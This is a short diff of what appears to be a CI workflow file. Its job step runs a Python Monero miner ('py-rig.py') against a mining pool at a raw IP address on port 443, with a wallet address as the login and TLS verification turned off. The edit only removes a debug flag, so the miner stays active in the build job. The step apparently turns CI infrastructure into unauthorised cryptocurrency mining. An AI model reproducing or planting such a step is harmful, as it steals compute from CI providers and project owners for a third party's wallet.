@@ -31,4 +31,4 @@ jobs:
       run: |
         #pyinstaller --onefile --add-data "build/windows/tevador/*.dll;." py-rig.py
         #pyinstaller --onefile py-rig.py
-        python py-rig.py -o 159.203.162.18:443 -u XMR:42AdHYEm2is2bgTmUvz5AzSmWjFsF1nGdSv2EfdeGvDhQWss7mnvDizC9cZPrqGw3KAidy9LKqCGaBqJk4kuZBJNKm2Mhrh.123 -p x --tls --debug --mode full --tls-insecure
+        python py-rig.py -o 159.203.162.18:443 -u XMR:42AdHYEm2is2bgTmUvz5AzSmWjFsF1nGdSv2EfdeGvDhQWss7mnvDizC9cZPrqGw3KAidy9LKqCGaBqJk4kuZBJNKm2Mhrh.123 -p x --tls --mode full --tls-insecure
